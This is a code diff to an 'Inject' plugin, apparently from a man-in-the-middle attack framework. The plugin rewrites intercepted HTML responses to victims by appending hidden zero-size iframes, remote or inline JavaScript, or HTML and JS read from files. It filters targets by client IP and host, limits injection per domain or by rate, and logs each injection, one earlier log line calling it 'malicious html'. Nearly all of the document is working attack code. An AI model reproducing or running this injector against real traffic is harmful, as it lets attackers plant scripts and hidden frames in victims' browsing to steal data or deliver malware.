@@ -17,10 +17,9 @@
 #
 
 import time
-import re
 import sys
-import argparse
 
+from bs4 import BeautifulSoup
 from plugins.plugin import Plugin
 
 class Inject(Plugin):
@@ -48,47 +47,58 @@ class Inject(Plugin):
         self.white_ips     = options.white_ips.split(',')
         self.white_domains = options.white_domains.split(',')
         self.black_domains = options.black_domains.split(',')
-        self.match_str     = options.match_str
         
         self.ctable        = {}
         self.dtable        = {}
         self.count         = 0
-        self.mime          = "text/html"
 
     def response(self, response, request, data):
-        ip, hn, mime = self._get_req_info(response)
-        if self._should_inject(ip, hn, mime) and self._ip_filter(ip) and self._host_filter(hn) and (hn not in self.ip):
-            if (not self.js_url == self.html_url is not None or not self.html_payload == ""):
-                data = self._insert_html(data, post=[(self.match_str, self.get_payload())])
-                self.ctable[ip] = time.time()
-                self.dtable[ip+hn] = True
-                self.count += 1
-                self.clientlog.info("Injected malicious html: {}".format(hn), extra=request.clientInfo)
+
+        ip = response.getClientIP()
+        hn = response.getRequestHostname()
+        mime = response.headers['Content-Type']
+
+        if self._should_inject(ip, hn) and self._ip_filter(ip) and self._host_filter(hn) and (hn not in self.ip) and ("text/html" in mime):
+            html = BeautifulSoup(data, "lxml")
+            if html.body:
+
+                if self.html_url:
+                    iframe = html.new_tag("iframe", src=self.html_url, frameborder=0, height=0, width=0)
+                    html.body.append(iframe)
+                    self.clientlog.info("Injected HTML Iframe: {}".format(hn))
+
+                if self.html_payload:
+                    payload = BeautifulSoup(self.html_payload, "html.parser")
+                    html.body.append(payload)
+                    self.clientlog.info("Injected HTML payload: {}".format(hn), extra=request.clientInfo)
+
+                if self.html_file:
+                    with open(self.html_file, 'r') as file:
+                        payload = BeautifulSoup(file.read(), "html.parser")
+                        html.body.append(payload)
+                    self.clientlog.info("Injected HTML file: {}".format(hn), extra=request.clientInfo)
+
+                if self.js_url:
+                    script = html.new_tag('script', type='text/javascript', src=self.js_url)
+                    html.body.append(script)
+                    self.clientlog.info("Injected JS script: {}".format(hn), extra=request.clientInfo)
+
+                if self.js_payload:
+                    tag = html.new_tag('script', type='text/javascript')
+                    tag.append(self.js_payload)
+                    html.body.append(tag)
+                    self.clientlog.info("Injected JS payload: {}".format(hn), extra=request.clientInfo)
+
+                if self.js_file:
+                    tag = html.new_tag('script', type='text/javascript')
+                    with open(self.js_file, 'r') as file:
+                        tag.append(file.read())
+                        html.body.append(tag)
+                    self.clientlog.info("Injected JS file: {}".format(hn), extra=request.clientInfo)
+
+                data = str(html)
 
         return {'response': response, 'request':request, 'data': data}
-
-    def get_payload(self):
-        payload = ''
-
-        if self.html_url is not None:
-            payload += '<iframe src="{}" height=0%% width=0%%></iframe>'.format(self.html_url)
-
-        if self.html_payload is not None:
-            payload += self.html_payload
-
-        if self.html_file:
-            payload += self.html_file.read()
-
-        if self.js_url is not None:
-            payload += '<script type="text/javascript" src="{}"></script>'.format(self.js_url)
-
-        if self.js_payload is not None:
-            payload += '<script type="text/javascript">{}</script>'.format(self.js_payload)
-
-        if self.js_file:
-            payload += '<script type="text/javascript">{}</script>'.format(self.js_file.read())
-
-        return payload
 
     def _ip_filter(self, ip):
 
@@ -122,8 +132,7 @@ class Inject(Plugin):
 
         return True
 
-
-    def _should_inject(self, ip, hn, mime):
+    def _should_inject(self, ip, hn):
 
         if self.count_limit == self.rate_limit is None and not self.per_domain:
             return True
@@ -138,45 +147,16 @@ class Inject(Plugin):
         if self.per_domain:
             return not ip+hn in self.dtable
 
-        return mime.find(self.mime) != -1
-
-    def _get_req_info(self, response):
-        ip = response.getClientIP()
-        hn = response.getRequestHostname()
-        mime = response.headers['Content-Type']
-        return (ip, hn, mime)
-
-    def _insert_html(self, data, pre=[], post=[], re_flags=re.I):
-        '''
-        To use this function, simply pass a list of tuples of the form:
-        
-        (string/regex_to_match,html_to_inject)
-        
-        NOTE: Matching will be case insensitive unless differnt flags are given
-        
-        The pre array will have the match in front of your injected code, the post
-        will put the match behind it.
-        '''
-        pre_regexes = [re.compile(r"(?P<match>"+i[0]+")", re_flags) for i in pre]
-        post_regexes = [re.compile(r"(?P<match>"+i[0]+")", re_flags) for i in post]
-
-        for i, r in enumerate(pre_regexes):
-            data = re.sub(r, "\g<match>"+pre[i][1], data)
-
-        for i, r in enumerate(post_regexes):
-            data = re.sub(r, post[i][1]+"\g<match>", data)
-
-        return data
+        return True
 
     def options(self, options):
         options.add_argument("--js-url", type=str, help="URL of the JS to inject")
         options.add_argument('--js-payload', type=str, help='JS string to inject')
-        options.add_argument('--js-file', type=argparse.FileType('r'), help='File containing JS to inject')
+        options.add_argument('--js-file', type=str, help='File containing JS to inject')
         options.add_argument("--html-url", type=str, help="URL of the HTML to inject")
         options.add_argument("--html-payload", type=str, help="HTML string to inject")
-        options.add_argument('--html-file', type=argparse.FileType('r'), help='File containing HTML to inject')
-        options.add_argument("--match-str", type=str, default='</body>', help="String you would like to match and place your payload before. (</body> by default)")
-        
+        options.add_argument('--html-file', type=str, help='File containing HTML to inject')
+
         group = options.add_mutually_exclusive_group(required=False)
         group.add_argument("--per-domain", action="store_true", help="Inject once per domain per client.")
         group.add_argument("--rate-limit", type=float, help="Inject once every RATE_LIMIT seconds per client.")
